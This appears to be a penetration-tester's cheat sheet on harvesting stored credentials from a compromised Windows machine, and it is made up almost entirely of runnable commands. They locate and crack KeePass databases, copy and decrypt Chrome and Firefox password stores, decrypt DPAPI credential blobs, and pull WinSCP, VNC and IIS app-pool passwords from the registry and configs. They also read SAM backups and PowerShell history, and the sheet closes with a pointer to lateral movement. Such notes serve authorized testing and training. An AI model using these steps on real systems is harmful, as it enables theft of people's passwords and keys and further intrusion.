# Application and user credential stores

Hunt by file and key, not by password string. A recovered secret is a candidate until it authenticates (scope: local/domain, service) → [credentials](credentials.md).

## Find the files
```cmd
dir /s /b C:\Users\*.kdbx C:\Users\*.rdg C:\Users\*.rdp C:\Users\*.ppk C:\Users\*.ovpn C:\Users\*.vnc 2>nul
dir /s /b C:\*unattend*.xml C:\*sysprep*.xml C:\*.config 2>nul | findstr /i "web.config unattend sysprep"
dir /s /b C:\Users\*id_rsa* C:\Users\*.pem C:\Users\*.pfx 2>nul
```
```powershell
Get-ChildItem C:\Users -Recurse -Include *.kdbx,*.rdg,*.ppk,*.ovpn,*.pfx,*.kirbi,*.ccache -ErrorAction SilentlyContinue |
    Select-Object FullName
```

## KeePass
```bash
keepass2john Database.kdbx > keepass.hash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash
```
- Key file next to the database (`.key`, any file): `keepass2john -k <KEYFILE> Database.kdbx`.
- Config naming the database and last key file: `%APPDATA%\KeePass\KeePass.config.xml`.
- Open with `kpcli` / `keepassxc-cli` once cracked.

## Browsers
| Browser | Files | Notes |
| --- | --- | --- |
| Firefox | `%APPDATA%\Mozilla\Firefox\Profiles\<PROFILE>\logins.json` + `key4.db` | No master password → `firefox_decrypt.py <PROFILE-DIR>` on Kali |
| Chrome / Edge | `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data` + `..\Local State` | Encrypted with DPAPI as that user; decrypt on the target as that user, or with the user's DPAPI masterkey |
| IE legacy | Credential Manager / Vault | `vault::cred` ([credential-access](credential-access.md)) |

```cmd
copy "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" C:\Temp\LoginData
```
- Copy the files (the browser locks them while open); decrypting Chrome secrets needs the same user context → SharpChromium / SharpDPAPI as that user.

## DPAPI blobs (credential files, vault)
```cmd
dir /a %APPDATA%\Microsoft\Credentials
dir /a %LOCALAPPDATA%\Microsoft\Credentials
dir /a %APPDATA%\Microsoft\Protect\<SID>
cmdkey /list
```
Offline with the user's password (or on the box as that user):
```text
dpapi::masterkey /in:"<MASTERKEY-FILE>" /sid:<USER-SID> /password:<PW>
dpapi::cred /in:"<CREDENTIAL-FILE>" /masterkey:<MASTERKEY-HEX>
```
- Domain user + reachable DC: `dpapi::masterkey /in:... /rpc`. SharpDPAPI automates this on the target.
- Masterkey file names are GUIDs; the `dpapi::cred` output prints the `guidMasterKey` it needs.

## Remote-access clients
| Client | Where |
| --- | --- |
| PuTTY | `HKCU\Software\SimonTatham\PuTTY\Sessions` (host, user; key path in `PublicKeyFile`); `.ppk` → `puttygen key.ppk -O private-openssh -o id_rsa` |
| WinSCP | `HKCU\Software\Martin Prikryl\WinSCP 2\Sessions` (`Password` is reversible), or `WinSCP.ini` |
| FileZilla | `%APPDATA%\FileZilla\recentservers.xml`, `sitemanager.xml` (base64) |
| mRemoteNG | `%APPDATA%\mRemoteNG\confCons.xml` (decryptable; default master password `mR3m`) |
| RDP | `cmdkey /list`; `.rdg` / `.rdp` files; Remote Desktop Connection Manager |
| VNC | RealVNC `HKLM\SOFTWARE\RealVNC\WinVNC4`, TightVNC `HKLM\SOFTWARE\TightVNC\Server` (`Password`) → DES with fixed key ([VNC](../enum/exposed-services.md#vnc-5900)) |
| OpenVPN | `*.ovpn` with `auth-user-pass <file>` |

```cmd
reg query "HKCU\Software\Martin Prikryl\WinSCP 2\Sessions" /s
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v password
reg query "HKLM\SOFTWARE\TightVNC\Server" /v Password
```

## Web and database server configs
```cmd
type C:\inetpub\wwwroot\web.config
type C:\Windows\System32\inetsrv\config\applicationHost.config
C:\Windows\System32\inetsrv\appcmd.exe list apppool /text:name /text:processModel.userName /text:processModel.password
type C:\xampp\passwords.txt
dir /s /b C:\xampp\*config*.php C:\wamp*\*.php 2>nul
```
- `connectionStrings` and `<identity impersonate password>` carry creds; app-pool passwords show only with admin.

## Sticky Notes, WSL, backups
```cmd
dir "%LOCALAPPDATA%\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState"
wsl -l -v
dir %LOCALAPPDATA%\Packages\*Linux* /s /b 2>nul | findstr /i "rootfs home"
dir C:\Windows\repair C:\Windows\System32\config\RegBack 2>nul
dir C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt /s /b 2>nul
```
- Sticky Notes: `plum.sqlite` → `sqlite3 plum.sqlite "select Text from Note;"` on Kali.
- WSL: `wsl -u root` may give root in the distro without a password; its filesystem and `~/.bash_history` / `.ssh/` hold creds. The distro root is a Linux root, not Windows admin.
- `SAM`, `SYSTEM`, `SECURITY` copies in `repair` / `RegBack` (readable to users on very old builds) → [credential-access](credential-access.md#local-sam-and-lsa).
- PowerShell history of every profile: `ConsoleHost_history.txt` per user.

## Next
Candidate secret → [credentials](credentials.md) (test scope), [lateral movement](../ad/lateral-movement.md) on domain hosts.
